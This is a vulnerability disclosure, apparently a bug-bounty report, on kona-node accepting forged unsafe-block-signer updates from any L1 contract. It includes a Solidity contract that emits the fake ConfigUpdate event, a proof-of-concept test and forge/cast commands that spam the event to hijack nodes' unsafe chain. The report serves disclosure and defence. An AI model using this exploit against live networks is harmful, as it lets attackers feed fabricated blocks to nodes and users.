# kona-node — L1 watcher accepts `ConfigUpdate(UnsafeBlockSigner)` logs from any L1 contract — anyone can replace the P2P block signer and hijack the unsafe chain

| Field | Value |
|---|---|
| **Target** | kona-node, `crates/node/service/src/actors/l1_watcher_rpc.rs` (`L1WatcherRpc::start`) |
| **Asset type** | Blockchain/DLT |
| **Severity** | Medium (the defect class is High; downgraded because kona-node had no release while the bug was live) |
| **Impact category** | "Unintended chain split (network partition)" (temporary split of the unsafe head on kona-nodes) |
| **Fix commit(s)** | dc6313b8e7a949c7a0b88273a48fbd217cfc315d (op-rs/kona#2041), 2025-06-06 |
| **Vulnerable since** | 96998da8fba23e08e0a58e2e8df43ae8f753cfda (op-rs/kona#1386, "Unsafe Block Signer Updates"), 2025-04-08. About 2 months on `main`. The first kona-node release (`kona-node/v1.0.0-rc.1`, 2025-07-31) already contains the fix |

## Brief / Intro

OP Stack nodes accept "unsafe" (not yet L1-confirmed) blocks over P2P gossip only if they are signed by the chain's sequencer key, the *unsafe block signer*. The chain operator can rotate that key by calling `SystemConfig.setUnsafeBlockSigner` on L1, which emits a `ConfigUpdate` event. kona-node watched every new L1 block for this event, but it never checked *which contract* emitted it. Any L1 user could deploy a contract that emits an identical-looking event naming their own key. Every kona-node would then trust the attacker as the sequencer, accept the attacker's fake blocks, and reject the real sequencer's blocks.

## Vulnerability Details

At the parent of the fix, the watcher fetched **all** logs of each new L1 head block, with no address filter:

```rust
// crates/node/service/src/actors/l1_watcher_rpc.rs:75-82 (parent of dc6313b8)
async fn fetch_logs(&self, block_hash: B256) -> Result<Vec<Log>, ...> {
    let logs = self.l1_provider
        .get_logs(&alloy_rpc_types_eth::Filter::new().select(block_hash))
        .await?;
    Ok(logs)
}
```

It then treated any log that *decodes* as a SystemConfig update as authoritative:

```rust
// l1_watcher_rpc.rs:193-209
let logs = self.fetch_logs(head_block_info.hash).await?;
let ecotone_active = self.config.is_ecotone_active(head_block_info.timestamp);
for log in logs {
    let sys_cfg_log = SystemConfigLog::new(log.into(), ecotone_active);
    if let Ok(SystemConfigUpdate::UnsafeBlockSigner(UnsafeBlockSignerUpdate { unsafe_block_signer })) = sys_cfg_log.build() {
        info!(target: "l1_watcher", "Unsafe block signer update: {unsafe_block_signer}");
        if let Err(e) = self.block_signer_sender.send(unsafe_block_signer) { ... }
    }
}
```

`SystemConfigLog::build` (`crates/protocol/genesis/src/system/log.rs`) checks only `topics[0] == CONFIG_UPDATE_TOPIC`, `topics[1] == version 0`, `topics[2] == update type`, and the ABI layout of the data (`updates/signer.rs`: 96 bytes, pointer 32, length 32, address). None of these depend on the emitter. The address is forwarded through `NetworkActor` (`network.rs:108-121`) to the gossip driver, which replaces the signer watched by `BlockHandler::block_valid`. From then on, `block_valid` only accepts payloads whose signature recovers to the attacker's address.

The fix restricts processing to logs emitted by the chain's configured SystemConfig proxy:

```diff
                         for log in logs {
+                            if log.address() != self.config.l1_system_config_address {
+                                continue; // Skip logs not related to the system config.
+                            }
+
                             let sys_cfg_log = SystemConfigLog::new(log.into(), ecotone_active);
```

(op-node does the equivalent: it only processes SystemConfig receipts whose log address equals `cfg.L1SystemConfigAddress`.)

### Attack scenario

1. The attacker deploys an L1 contract:
   ```solidity
   contract FakeSysCfg {
       event ConfigUpdate(uint256 indexed version, uint8 indexed updateType, bytes data);
       function go(address signer) external {
           emit ConfigUpdate(0, 3 /* UNSAFE_BLOCK_SIGNER */, abi.encode(signer));
       }
   }
   ```
2. The attacker calls `go(attackerKey)` in some L1 block. The watcher polls the latest L1 head about every 13 seconds and may skip blocks, so the attacker repeats the call every few blocks until one lands in a polled head. Each call costs about 30k gas.
3. Every kona-node that sees that head switches its expected unsafe signer to `attackerKey`.
4. Result: gossip blocks from the real sequencer now fail `block_valid` with `Signer { .. }` and are rejected, and the victim penalizes the honest peers that relay them. Blocks the attacker gossips (any contents, signed by `attackerKey`) pass validation and are inserted as the kona-node's unsafe head. The kona-node, and anyone querying its RPC for `latest`, follows the attacker's fabricated chain until L1 derivation reorgs it back to the batch-derived safe chain. The attacker can keep re-emitting the event to keep the hijack going indefinitely. If the real operator later rotates the key legitimately, the attacker simply re-emits.

## Impact Details

- **Who can trigger:** anyone with an L1 account. No P2P privileges are needed for the signer switch.
- **Effects on kona-nodes:** (1) the unsafe head is hijacked or forked, so applications trusting `latest` (bridges' UIs, exchanges crediting on unsafe blocks, MEV and searcher infrastructure) see fabricated blocks; (2) real sequencer blocks are rejected, so kona-nodes fall back to L1-derivation latency (minutes instead of seconds); (3) honest peers are down-scored for relaying legitimate blocks. Safe and finalized heads are unaffected because derivation does not use the P2P signer.
- **Mitigating factors:** kona-node was pre-release throughout the vulnerable window (2025-04-08 to 2025-06-06). The first tagged kona-node release, `v1.0.0-rc.1` on 2025-07-31, contains the fix. Only operators running `main` builds (devnets and testnets) were exposed. op-node was never affected.
- **Severity:** in a production client this would be at least High (anyone can take over unsafe-block authority network-wide). Because it never shipped in a release it is reported as **Medium**.

## Proof of Concept

**(A) Unit test: the parser authenticates nothing.** Add to `crates/protocol/genesis/src/updates/signer.rs` tests. It passes on both commits and demonstrates that the only guard is the watcher-level address check added by the fix.

```rust
#[test]
fn poc_signer_update_from_arbitrary_emitter() {
    let attacker_contract = address!("00000000000000000000000000000000deadbeef");
    let log = Log {
        address: attacker_contract, // not the SystemConfig proxy
        data: LogData::new_unchecked(
            vec![CONFIG_UPDATE_TOPIC, CONFIG_UPDATE_EVENT_VERSION_0, B256::with_last_byte(3)], // UpdateType 3 = UnsafeBlockSigner
            hex!("0000000000000000000000000000000000000000000000000000000000000020\
                  0000000000000000000000000000000000000000000000000000000000000020\
                  000000000000000000000000a77ac4e7a77ac4e7a77ac4e7a77ac4e7a77ac4e7").into(),
        ),
    };
    let upd = SystemConfigLog::new(log, true).build().unwrap();
    assert!(matches!(upd, SystemConfigUpdate::UnsafeBlockSigner(u)
        if u.unsafe_block_signer == address!("a77ac4e7a77ac4e7a77ac4e7a77ac4e7a77ac4e7")));
}
```

**(B) End-to-end reproduction** (kona repo at `dc6313b8e7a9^`, i.e. upstream op-rs/kona before #2041):

```
# 1. L1 devnet (anvil) with an OP chain deployed and a kona-node + EL following it (e.g. kona's devnet/kurtosis setup).
# 2. Deploy the FakeSysCfg contract above on L1 and spam the event:
forge create FakeSysCfg --rpc-url $L1 --private-key $PK
for i in $(seq 1 10); do cast send $FAKE "go(address)" $ATTACKER_ADDR --rpc-url $L1 --private-key $PK; sleep 6; done
# 3. kona-node logs show:  INFO l1_watcher: Unsafe block signer update: <ATTACKER_ADDR>
# 4. Real sequencer gossip is now rejected (BlockInvalidError::Signer); gossip a block signed by ATTACKER_ADDR
#    (sign PayloadHash::signature_message(chain_id)) and observe it become the kona-node's unsafe head.
# 5. Repeat on dc6313b8e7a9 (fix): the log is skipped, the signer is unchanged, and the forged block is rejected.
```

Executed: no.

## Recommendation

The fix, filtering on `l1_system_config_address`, is correct. Further hardening:
- Push the address filter into the RPC query (`Filter::new().select(hash).address(l1_system_config_address).event_signature(CONFIG_UPDATE_TOPIC)`). This avoids downloading every L1 log and makes the check impossible to forget in the loop.
- Consider moving the check into `SystemConfigLog` or a constructor that takes the expected emitter, so every consumer of the parser (derivation, watcher, tooling) authenticates the source.
- The watcher polls only the *latest* head and may skip L1 blocks, so legitimate signer rotations can be missed. Process logs for every block between the previous and current head, handle L1 reorgs, and prefer the value confirmed by derivation.

## References

- Fix commit: dc6313b8e7a949c7a0b88273a48fbd217cfc315d
- Pull request: https://github.com/op-rs/kona/pull/2041 (introduced by https://github.com/op-rs/kona/pull/1386)
- Relevant files: `crates/node/service/src/actors/l1_watcher_rpc.rs`, `crates/node/service/src/actors/network.rs`, `crates/node/p2p/src/gossip/block_validity.rs`, `crates/protocol/genesis/src/system/log.rs`, `crates/protocol/genesis/src/updates/signer.rs`
- Specs: https://specs.optimism.io/protocol/system-config.html#unsafeblocksigner-address-type-3 , https://specs.optimism.io/protocol/rollup-node-p2p.html#block-validation
